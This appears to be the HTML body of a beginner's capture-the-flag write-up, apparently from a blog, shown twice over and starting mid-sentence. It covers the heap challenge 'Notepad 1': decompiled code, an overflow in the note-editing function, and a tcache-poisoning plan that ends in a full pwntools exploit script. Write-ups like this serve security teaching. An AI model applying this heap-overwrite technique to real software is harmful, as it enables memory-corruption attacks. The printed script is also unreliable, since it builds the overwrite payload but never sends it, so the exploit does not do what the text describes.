so I don’t use it.</p>\n<p>The only really important file is the challenge binary itself, as even though the libc and linker were provided I didn’t end up using them</p>\n<p>Opening it up in Ghidra, we can see it looks like a pretty simple CRUD heap challenge with a win function.<br>After looking around a bit, I found the main vulnerability. When creating a note, you are only allowed to write to the allocated chunk the size of the chunk, but when updating it, you are allowed to write up to a set amount of 0x100 bytes.</p>\n<p><code>createNote</code>:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;How large you want the note to be?&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">__isoc99_scanf(&amp;DAT_001014c3,&amp;size);</span><br><span class=\"line\">uVar1 = index;</span><br><span class=\"line\">pvVar2 = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">*(<span class=\"type\">void</span> **)(notepad + (ulong)uVar1 * <span class=\"number\">8</span>) = pvVar2;</span><br><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Add your note:&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">local_28 = *(<span class=\"type\">long</span> *)(notepad + (ulong)index * <span class=\"number\">8</span>);</span><br><span class=\"line\">sVar3 = read(<span class=\"number\">0</span>,*(<span class=\"type\">void</span> **)(notepad + (ulong)index * <span class=\"number\">8</span>),size);</span><br></pre></td></tr></table></figure>\n<p><code>editNote</code>:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Your changes:&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">read(<span class=\"number\">0</span>,*(<span class=\"type\">void</span> **)(notepad + (ulong)index * <span class=\"number\">8</span>),<span class=\"number\">0x100</span>);</span><br></pre></td></tr></table></figure>\n<p>This gives us an easy write primitive in subsequent heap chunks, meaning we can do things like overwrite metadata in the following heap chunks. </p>\n<h1 id=\"The-plan\"><a href=\"#The-plan\" class=\"headerlink\" title=\"The plan\"></a>The plan</h1><p>Armed with a write primitive, we can start planning our exploit. The binary very generously gives us a PIE leak at the start of the program, meaning there is essentially no PIE, so we just need to find a way to call our win function. </p>\n<p>Speaking of, here it is in Ghidra (or at least the important part):</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">secretNote</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> __fd;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> __n;</span><br><span class=\"line\">  <span class=\"type\">long</span> in_FS_OFFSET;</span><br><span class=\"line\">  undefined local_418 [<span class=\"number\">1032</span>];</span><br><span class=\"line\">  undefined8 local_10;</span><br><span class=\"line\">  </span><br><span class=\"line\">  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class=\"number\">0x28</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (key != <span class=\"number\">-0x35014542</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You don\\&#x27;t have access!&quot;</span>);</span><br><span class=\"line\">                    <span class=\"comment\">/* WARNING: Subroutine does not return */</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> <span class=\"comment\">/* Print flag code */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>That number <code>-0x35014542</code> is actually <code>0xcafebabe</code> but because its a signed number Ghidra thinks its a negative number.<br>We can see that to get the flag we must first write 0xcafebabe to the global variable <code>key</code> then call secretNote (which there is an option for in the menu).</p>\n<hr>\n<p>So how can we write to <code>key</code>? Recall that we have an overflow in the update function that allows us to overwrite the subsequent chunks of an arbitrary chunk.</p>\n<p>This means that we can overwrite the FD and BK pointers of a freed chunk to point to <code>key</code>, which will cause the program to think that <code>key</code> is a freed chunk in the tcache,  and will return a pointer to <code>key</code> after allocating twice.</p>\n<p>So, we can allocate two chunks and write 0xcafebabe to the second one, which will be at <code>key</code>, then just call the win function.</p>\n<p>Before overwrite:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00: 0x0000000000000000 0x0000000000000020 (chunk1)</span><br><span class=\"line\">0x10: 0x6161616161616161 0x6161616161616161</span><br><span class=\"line\">0x20: 0x6161616161616161 0x0000000000000020 (chunk2)</span><br><span class=\"line\">0x30: 0x(NULL_FD_PTR)</span><br></pre></td></tr></table></figure>\n<p>After overwrite:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00: 0x0000000000000000 0x0000000000000020 (chunk1)</span><br><span class=\"line\">0x10: 0x6161616161616161 0x6161616161616161</span><br><span class=\"line\">0x20: 0x6161616161616161 0x0000000000000020 (chunk2)</span><br><span class=\"line\">0x30: 0x(OUR_FD_PTR)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">exe = ELF(<span class=\"string\">&quot;./notepad_patched&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">ld = ELF(<span class=\"string\">&quot;./ld-linux-x86-64.so.2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.binary = exe</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">conn</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> args.REMOTE:</span><br><span class=\"line\">        p = remote(<span class=\"string\">&quot;notepad.ctf.intigriti.io&quot;</span>, <span class=\"number\">1341</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        p = process([exe.path])</span><br><span class=\"line\">        <span class=\"keyword\">if</span> args.DB:</span><br><span class=\"line\">            gdb.attach(p)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> p</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">p, i, size, data</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(i).encode())</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(size).encode())</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read</span>(<span class=\"params\">p, i</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(i).encode())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p.recvuntil(<span class=\"string\">b&#x27;\\n\\n\\nChoose&#x27;</span>, drop=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">update</span>(<span class=\"params\">p, i, data</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(i).encode())</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">p, i</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(i).encode())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    p = conn()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># good luck pwning :)</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">b&#x27;gift: &#x27;</span>)</span><br><span class=\"line\">    exe_leak = <span class=\"built_in\">int</span>(p.recvline().strip(), <span class=\"number\">16</span>)</span><br><span class=\"line\">    exe.address = exe_leak - exe.sym[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(exe.address))</span><br><span class=\"line\"></span><br><span class=\"line\">    create(p, <span class=\"number\">0</span>, <span class=\"number\">16</span>, <span class=\"string\">b&#x27;deadbeef&#x27;</span>)  <span class=\"comment\"># chunk1</span></span><br><span class=\"line\">    create(p, <span class=\"number\">1</span>, <span class=\"number\">16</span>, <span class=\"string\">b&#x27;deadc0de&#x27;</span>)  <span class=\"comment\"># chunk2</span></span><br><span class=\"line\">    delete(p, <span class=\"number\">1</span>)                   <span class=\"comment\"># Free chunk2 to put it in tcache</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">24</span>            <span class=\"comment\"># Pad until FD ptr</span></span><br><span class=\"line\">    payload += flat(<span class=\"number\">0x21</span>, exe.sym[<span class=\"string\">&#x27;key&#x27;</span>]) <span class=\"comment\"># Overwrite FD</span></span><br><span class=\"line\"></span><br><span class=\"line\">    create(p, <span class=\"number\">2</span>, <span class=\"number\">16</span>, <span class=\"string\">b&#x27;cafef00d&#x27;</span>)  <span class=\"comment\"># Alloc once to use actual tcache chunk</span></span><br><span class=\"line\">    create(p, <span class=\"number\">3</span>, <span class=\"number\">16</span>, flat(<span class=\"number\">0xcafebabe</span>))  <span class=\"comment\"># Alloc once more to use our fake chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;5&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>This was my first ever pwn writeup and second writeup ever so please give feedback thanks.</p>\n","excerpt":"","more":"<p>I played in 1337up CTF last weekend but no one wants to hear about my day so here are my writeups for the few pwn challenges I solved.</p>\n<h1 id=\"Notepad-1\"><a href=\"#Notepad-1\" class=\"headerlink\" title=\"Notepad 1\"></a>Notepad 1</h1><h4 id=\"baby-heap-pwn\"><a href=\"#baby-heap-pwn\" class=\"headerlink\" title=\"baby heap pwn\"></a>baby heap pwn</h4><h2 id=\"Analysis\"><a href=\"#Analysis\" class=\"headerlink\" title=\"Analysis\"></a>Analysis</h2><p>We are presented with a few files to host the challenge with a docker instance locally but I’m lazy and there’s not much point anyways so I don’t use it.</p>\n<p>The only really important file is the challenge binary itself, as even though the libc and linker were provided I didn’t end up using them</p>\n<p>Opening it up in Ghidra, we can see it looks like a pretty simple CRUD heap challenge with a win function.<br>After looking around a bit, I found the main vulnerability. When creating a note, you are only allowed to write to the allocated chunk the size of the chunk, but when updating it, you are allowed to write up to a set amount of 0x100 bytes.</p>\n<p><code>createNote</code>:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;How large you want the note to be?&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">__isoc99_scanf(&amp;DAT_001014c3,&amp;size);</span><br><span class=\"line\">uVar1 = index;</span><br><span class=\"line\">pvVar2 = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">*(<span class=\"type\">void</span> **)(notepad + (ulong)uVar1 * <span class=\"number\">8</span>) = pvVar2;</span><br><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Add your note:&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">local_28 = *(<span class=\"type\">long</span> *)(notepad + (ulong)index * <span class=\"number\">8</span>);</span><br><span class=\"line\">sVar3 = read(<span class=\"number\">0</span>,*(<span class=\"type\">void</span> **)(notepad + (ulong)index * <span class=\"number\">8</span>),size);</span><br></pre></td></tr></table></figure>\n<p><code>editNote</code>:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Your changes:&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">read(<span class=\"number\">0</span>,*(<span class=\"type\">void</span> **)(notepad + (ulong)index * <span class=\"number\">8</span>),<span class=\"number\">0x100</span>);</span><br></pre></td></tr></table></figure>\n<p>This gives us an easy write primitive in subsequent heap chunks, meaning we can do things like overwrite metadata in the following heap chunks. </p>\n<h1 id=\"The-plan\"><a href=\"#The-plan\" class=\"headerlink\" title=\"The plan\"></a>The plan</h1><p>Armed with a write primitive, we can start planning our exploit. The binary very generously gives us a PIE leak at the start of the program, meaning there is essentially no PIE, so we just need to find a way to call our win function. </p>\n<p>Speaking of, here it is in Ghidra (or at least the important part):</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">secretNote</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> __fd;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> __n;</span><br><span class=\"line\">  <span class=\"type\">long</span> in_FS_OFFSET;</span><br><span class=\"line\">  undefined local_418 [<span class=\"number\">1032</span>];</span><br><span class=\"line\">  undefined8 local_10;</span><br><span class=\"line\">  </span><br><span class=\"line\">  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class=\"number\">0x28</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (key != <span class=\"number\">-0x35014542</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You don\\&#x27;t have access!&quot;</span>);</span><br><span class=\"line\">                    <span class=\"comment\">/* WARNING: Subroutine does not return */</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> <span class=\"comment\">/* Print flag code */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>That number <code>-0x35014542</code> is actually <code>0xcafebabe</code> but because its a signed number Ghidra thinks its a negative number.<br>We can see that to get the flag we must first write 0xcafebabe to the global variable <code>key</code> then call secretNote (which there is an option for in the menu).</p>\n<hr>\n<p>So how can we write to <code>key</code>? Recall that we have an overflow in the update function that allows us to overwrite the subsequent chunks of an arbitrary chunk.</p>\n<p>This means that we can overwrite the FD and BK pointers of a freed chunk to point to <code>key</code>, which will cause the program to think that <code>key</code> is a freed chunk in the tcache,  and will return a pointer to <code>key</code> after allocating twice.</p>\n<p>So, we can allocate two chunks and write 0xcafebabe to the second one, which will be at <code>key</code>, then just call the win function.</p>\n<p>Before overwrite:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00: 0x0000000000000000 0x0000000000000020 (chunk1)</span><br><span class=\"line\">0x10: 0x6161616161616161 0x6161616161616161</span><br><span class=\"line\">0x20: 0x6161616161616161 0x0000000000000020 (chunk2)</span><br><span class=\"line\">0x30: 0x(NULL_FD_PTR)</span><br></pre></td></tr></table></figure>\n<p>After overwrite:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00: 0x0000000000000000 0x0000000000000020 (chunk1)</span><br><span class=\"line\">0x10: 0x6161616161616161 0x6161616161616161</span><br><span class=\"line\">0x20: 0x6161616161616161 0x0000000000000020 (chunk2)</span><br><span class=\"line\">0x30: 0x(OUR_FD_PTR)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">exe = ELF(<span class=\"string\">&quot;./notepad_patched&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">ld = ELF(<span class=\"string\">&quot;./ld-linux-x86-64.so.2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.binary = exe</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">conn</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> args.REMOTE:</span><br><span class=\"line\">        p = remote(<span class=\"string\">&quot;notepad.ctf.intigriti.io&quot;</span>, <span class=\"number\">1341</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        p = process([exe.path])</span><br><span class=\"line\">        <span class=\"keyword\">if</span> args.DB:</span><br><span class=\"line\">            gdb.attach(p)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> p</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">p, i, size, data</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(i).encode())</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(size).encode())</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read</span>(<span class=\"params\">p, i</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(i).encode())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p.recvuntil(<span class=\"string\">b&#x27;\\n\\n\\nChoose&#x27;</span>, drop=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">update</span>(<span class=\"params\">p, i, data</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(i).encode())</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">p, i</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"built_in\">str</span>(i).encode())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    p = conn()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># good luck pwning :)</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">b&#x27;gift: &#x27;</span>)</span><br><span class=\"line\">    exe_leak = <span class=\"built_in\">int</span>(p.recvline().strip(), <span class=\"number\">16</span>)</span><br><span class=\"line\">    exe.address = exe_leak - exe.sym[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(exe.address))</span><br><span class=\"line\"></span><br><span class=\"line\">    create(p, <span class=\"number\">0</span>, <span class=\"number\">16</span>, <span class=\"string\">b&#x27;deadbeef&#x27;</span>)  <span class=\"comment\"># chunk1</span></span><br><span class=\"line\">    create(p, <span class=\"number\">1</span>, <span class=\"number\">16</span>, <span class=\"string\">b&#x27;deadc0de&#x27;</span>)  <span class=\"comment\"># chunk2</span></span><br><span class=\"line\">    delete(p, <span class=\"number\">1</span>)                   <span class=\"comment\"># Free chunk2 to put it in tcache</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">24</span>            <span class=\"comment\"># Pad until FD ptr</span></span><br><span class=\"line\">    payload += flat(<span class=\"number\">0x21</span>, exe.sym[<span class=\"string\">&#x27;key&#x27;</span>]) <span class=\"comment\"># Overwrite FD</span></span><br><span class=\"line\"></span><br><span class=\"line\">    create(p, <span class=\"number\">2</span>, <span class=\"number\">16</span>, <span class=\"string\">b&#x27;cafef00d&#x27;</span>)  <span class=\"comment\"># Alloc once to use actual tcache chunk</span></span><br><span class=\"line\">    create(p, <span class=\"number\">3</span>, <span class=\"number\">16</span>, flat(<span class=\"number\">0xcafebabe</span>))  <span class=\"comment\"># Alloc once more to use our fake chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&#x27;&gt; &#x27;</span>, <span class=\"string\">b&#x27;5&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>This was my first ever pwn writeup and second writeup ever so please give feedback 